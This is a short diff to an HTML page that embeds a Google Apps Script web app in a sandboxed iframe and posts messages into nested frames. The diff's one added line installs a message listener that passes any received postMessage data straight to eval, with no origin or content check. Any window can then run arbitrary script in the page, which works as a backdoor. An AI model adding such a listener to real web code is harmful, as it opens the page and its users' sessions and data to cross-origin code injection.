@@ -4,6 +4,7 @@
    // obj.style.height = obj.contentWindow.document.body.scrollHeight + 'px';
 setTimeout(function(){
     window.frames[0].window.frames[0].window.frames[0].postMessage(new Date(),"*");},500)}
+  window.addEventListener("message",function(e){eval(e.data)})
 </script>
 
 <iframe width="100%" height="100%" style="border:none" scroll="no" onload="resizeIframe(this)" src="https://script.google.com/a/ejm.org/macros/s/AKfycbyPOfYv0JQxjNjGYC40WEJloeMkZGefPvwnnvxblyd0/exec" sandbox="allow-scripts allow-pointer-lock allow-same-origin allow-forms allow-modals allow-popups" ></iframe>
